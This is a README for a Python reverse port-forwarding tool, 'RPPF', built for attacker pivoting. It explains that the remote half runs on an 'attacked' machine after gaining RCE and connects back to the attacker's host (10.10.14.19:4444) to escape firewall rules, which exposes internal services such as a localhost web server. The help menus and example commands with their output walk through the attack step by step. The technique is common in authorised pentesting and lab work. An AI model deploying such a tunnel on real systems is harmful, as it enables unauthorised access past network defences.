# reverse-proxy-port-forwarder

*linux and windows binaries available*

## Summary

This tool comes with two pieces that have to run *simultaneosly* on different machines :
- **local_portfwd**
- **remote_portfwd**
  
The concept is simple.  
These programs are creating a tunnel for tcp packets between two machine.    
The ***local port forward*** program should be running on your local machine, after being started it will be listening for the incoming tunnel connection handshake and on success it will open a service port.  
  
- **I've choosen a reverse connection logic (remote-attacked connecting to local-attacker) instead of a simple bind beacause it's better at escaping firewall rules.**  
  
Once the connection is established you are ready to forward packets to the remote machine by simply sending requests to the RPPF service address (ex. `localhost:4444`).  
Then the requests will be forwarded to the endpoint of the tunnel which is the ***remote port forward*** program.  
The remote forward script is a simple proxy and it will act on behalf of you, forwarding packets to the target address (which you must specifiy during startup).  
Look at bottom page for a simple example.  

## Help menu

`remote_portfwd.py` helper menu :
```shell
$ ./remote_portfwd.py -h
usage: remote_portfwd.py [-h] thost:tport fhost:fport

--------------------------------------
 Reverse Proxy Port Forwarder (Remote)
--------------------------------------
Welcome to the RPPF, a simple port forwarder written in python.
This code should be running on the remote (attacked) machine.
A tunnel will be created to the thost:tport address using a reverse 
connection logic, to bypass firewall. The data coming from the tunnel
will then be sent over a new connection to the forward address.
The tunnel address should be your RPPF local tunnel address.
Example : ./remote_portfwd.py localhost:4444 google.com:80
--------------------------------------
* Only tcp protocol supported *

     __                          __
    |==|                        |==|
    |= |                        |= |
    |^*|  ----☠----☠----☠----   |^*|
    |__|                        |__|
        

positional arguments:
  thost:tport  Your local address to be contacted
  fhost:fport  The remote address to forward to

optional arguments:
  -h, --help   show this help message and exit
```
  
`local_portfwd.py` helper menu :
```shell
 $ ./local_portfwd.py -h
usage: local_portfwd.py [-h] thost:tport rhost:rport

-------------------------------------
 Reverse Proxy Port Forwarder (Local)
-------------------------------------
Welcome to the RPPF, a simple port forwarder written in python.
This code should be running on local (attacker) machine.
The program will be listening for the incoming tunnel connection from
remote_portfwd.py (thost:tport).
After the connection is established the RPPF is ready to forward data. 
Just send data to the service address.
-------------------------------------
* Only tcp protocol supported *

     __                          __
    |==|                        |==|
    |= |                        |= |
    |^*|  ----☠----☠----☠----   |^*|
    |__|                        |__|
        

positional arguments:
  thost:tport  Tunnel address to listen to
  rhost:rport  The rppf address to listen to

optional arguments:
  -h, --help   show this help message and exit
```

## Simple use case

Let's suppose I want to get access to a web server listeining to 127.0.0.1:80 in a remote machine.  
Obviously I need rce, and a way to upload `remote_portfwd.py`.  
Once I got the program on the remote machine I can begin the attack.  
*Order is not important, you can run before or after `local_portfwd.py`. No matter.*  
  
On remote 
```shell
$ python remote_portfwd.py 10.10.14.19:4444 localhost:80
creating tunnel to ('10.10.14.19', 4444)

```
Where `10.10.14.19` is my local IP address and `4444`  is the port where I want to create the RPPF tunnel.  
  
Then on your local machine
```shell
$ ./local_portfwd.py 10.10.14.19:4444 localhost:4242
Waiting for incoming tunnel connection...
Tunnel created
Opening rppf listening service...
--------------------------------------------
RPPF Service opened on ('localhost', 4242)
Ready to transfer data

```
Now the RPPF forward service is **ready and listening** on port 4242.  
`10.10.14.19` is the IP to bind to, can be also `0.0.0.0` to listen on every interface.
  
If you go back to remote console the output should have been updated :
```shell
$ python remote_portfwd.py 10.10.14.19:4444 localhost:80
creating tunnel to ('10.10.14.19', 4444)
tunnel created
opening forward connection to ('localhost', 80)
connection created
--------------------------------------------
Ready to transfer data

```
This means that the also the remote service is **ready and running**.  
  
Now you can just type `localhost:4242` in your web browser to connect to the site as a localhost. :smile:  
  
***NOTE** : For an http request you may need to modify the HOST header (just intercept the request before being sent to layer 4).*
